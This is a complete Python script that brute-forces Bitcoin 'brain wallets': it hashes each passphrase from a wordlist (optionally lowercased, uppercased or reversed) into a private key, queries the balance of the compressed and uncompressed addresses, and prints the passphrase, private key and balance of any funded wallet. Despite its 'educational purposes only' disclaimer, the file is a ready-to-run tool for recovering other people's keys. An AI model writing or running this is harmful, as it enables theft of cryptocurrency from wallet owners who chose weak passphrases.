#!/usr/bin/env python3
"""
Simple script to brute force bitcoin wallets with text file filled with passphrases
and print any keys with available balance. Program check for
both compressed and uncompressed versions of addresses using
bit library.

Example use: python brutecointxt.py -t passphrases.txt

DISCLAIMER: Program created for educational purposes only.
Don't steal anybody bitcoins and don't use easy to guess passphrases.
"""
from bit.format import bytes_to_wif # Uncompressed version of adress check shortcut
from tqdm import tqdm # Progress bar
from bit import Key # Generate private key, generate public key, check balance
import argparse # Argument parsing
import hashlib # Sha256 hashing

import sys

def main():
    counter = 0
    lowercase = uppercase = reverse = uncompressed = False
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-t', '--txt', action='store', dest='text_file',
                        help='Text file (UTF-8 encoding) with passphrases. Each line containting one example. (example: passphrases.txt)', required=True)
    parser.add_argument('-l', '--lowercase', action='store_true', dest='lowercase',
                        help='Additional check for lowercased version of passphrases', required=False)
    parser.add_argument('-u', '--uppercase', action='store_true', dest='uppercase',
                        help='Additional check for uppercased version of passphrases', required=False)
    parser.add_argument('-r', '--reverse', action='store_true', dest='reverse',
                        help='Additional check for reversed version of passphrases', required=False)
    parser.add_argument('-n', '--no-uncomp', action='store_true', dest='uncompressed',
                        help='Do not check uncompressed version of addresses', required=False)
    args = parser.parse_args()

    try:
        with open(args.text_file, encoding="utf-8") as file:
            total_lines = sum(1 for i in file)
            file.seek(0)
            bar = tqdm(total = total_lines,ascii=True)
            for line in file:
                passphrase = line.strip("\n")
                to_check = [passphrase]
                
                #Additional options
                if args.lowercase and not passphrase.islower(): to_check.append(passphrase.lower())
                if args.uppercase and not passphrase.isupper(): to_check.append(passphrase.upper())
                if args.reverse: to_check.append(passphrase[::-1])

                for phrase in to_check:
                    #Check compressed version for balance
                    private_key_hex = hashlib.sha256(phrase.encode('utf-8')).hexdigest()
                    private_key = Key.from_hex(private_key_hex)
                    balance = float(private_key.balance)

                    if not args.uncompressed:
                        #Check uncompressed version for balance
                        uncompressed_wif = bytes_to_wif(private_key.to_bytes(), compressed=False)
                        uncompressed_key = Key(uncompressed_wif)
                        balance += float(uncompressed_key.balance)
                    
                    if balance > 0.0:
                        print("\nPassphrase: ", phrase)
                        print("Private key hex: ", private_key_hex)
                        print("Private key wif: ", private_key.to_wif())
                        print("Compressed address: ", private_key.address)
                        if not args.uncompressed:
                            print("Uncompressed address: ", uncompressed_key.address)
                        print("Balance: ", balance)

                if counter % 1000 == 0:
                    bar.update(1000)
                counter += 1

    except IOError:
        print("File does not exist or is not accessible. Make sure encoding is UTF-8!")

if __name__ == '__main__':
    main()
